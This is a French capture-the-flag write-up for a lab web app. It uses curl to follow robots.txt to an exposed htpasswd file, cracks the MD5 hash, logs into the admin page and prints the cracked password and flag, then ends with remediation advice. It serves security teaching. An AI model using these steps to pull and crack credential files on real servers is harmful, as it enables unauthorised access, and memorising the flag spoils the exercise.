
---

# ROBOTS_WHATEVER

## Description de la faille

Une vulnérabilité a été découverte dans l'application web, permettant d'accéder à un fichier `.htpasswd` non sécurisé. En utilisant les informations de ce fichier, il est possible de se connecter à l'interface d'administration et d'obtenir un flag.

## Étapes pour découvrir la faille

1. **Observation des cookies** :
   - Utilisez `curl` pour envoyer une requête à l'application web :
     ```sh
     curl -I http://ip-addr/
     ```
   - Réponse :
     ```
     HTTP/1.1 200 OK
     Server: nginx/1.4.6 (Ubuntu)
     Date: Thu, 01 Aug 2024 11:34:23 GMT
     Content-Type: text/html
     Connection: keep-alive
     X-Powered-By: PHP/5.5.9-1ubuntu4.29
     Set-Cookie: I_am_admin=68934a3e9455fa72420237eb05902327; expires=Thu, 01-Aug-2024 12:34:23 GMT; Max-Age=3600
     ```

2. **Exploration du fichier `robots.txt`** :
   - Utilisez `curl` pour vérifier les directives du fichier `robots.txt` :
     ```sh
     curl http://ip-addr/robots.txt
     ```
   - Réponse :
     ```
     User-agent: *
     Disallow: /whatever
     Disallow: /.hidden
     ```

3. **Exploration du répertoire `/whatever`** :
   - Accédez au répertoire `/whatever` pour voir son contenu :
     ```sh
     curl http://ip-addr/whatever/
     ```
   - Réponse :
     ```html
     <html>
     <head><title>Index of /whatever/</title></head>
     <body bgcolor="white">
     <h1>Index of /whatever</h1><hr><pre><a href="../">../</a>
     <a href="htpasswd">htpasswd</a>                                           29-Jun-2021 18:09                  38
     </pre><hr></body>
     </html>
     ```

4. **Accès au fichier `.htpasswd`** :
   - Téléchargez le fichier `.htpasswd` pour récupérer les informations d'authentification :
     ```sh
     curl http://ip-addr/whatever/htpasswd
     ```
   - Réponse :
     ```
     root:437394baff5aa33daa618be47b75cb49
     ```

5. **Déchiffrement du mot de passe** :
   - Passez le hash MD5 `437394baff5aa33daa618be47b75cb49` dans un outil de décryptage MD5 pour obtenir le mot de passe :
     ```
     437394baff5aa33daa618be47b75cb49 = qwerty123@
     ```

6. **Accès à l'interface d'administration** :
   - Utilisez les informations d'authentification pour accéder à l'URL d'administration :
     ```sh
     http://ip-addr/admin
     ```
   - Connexion :
     ```
     Nom d'utilisateur : root
     Mot de passe : qwerty123@
     ```

7. **Obtention du flag** :
   - Une fois connecté à l'interface d'administration, le flag suivant est révélé :
     ```
     d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff
     ```

## Flag

```
d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff
```

## Recommandations pour corriger la faille

Pour corriger cette faille, voici quelques recommandations :

1. **Protéger les fichiers sensibles** : Assurez-vous que les fichiers comme `.htpasswd` ne sont pas accessibles publiquement.
2. **Configurer correctement les permissions du serveur** : Restreignez l'accès aux répertoires sensibles en utilisant des configurations de serveur appropriées.
3. **Utiliser des mots de passe sécurisés et non déchiffrables** : Utilisez des algorithmes de hachage sécurisés et des mots de passe complexes.
4. **Renforcer la sécurité de l'interface d'administration** : Implémentez des mesures de sécurité supplémentaires telles que l'authentification multifactorielle (MFA).

## Conclusion

Cette faille montre l'importance de sécuriser les fichiers et répertoires sensibles, ainsi que d'utiliser des mots de passe robustes et des configurations de serveur appropriées. En suivant les recommandations ci-dessus, la sécurité de l'application peut être significativement améliorée.

---
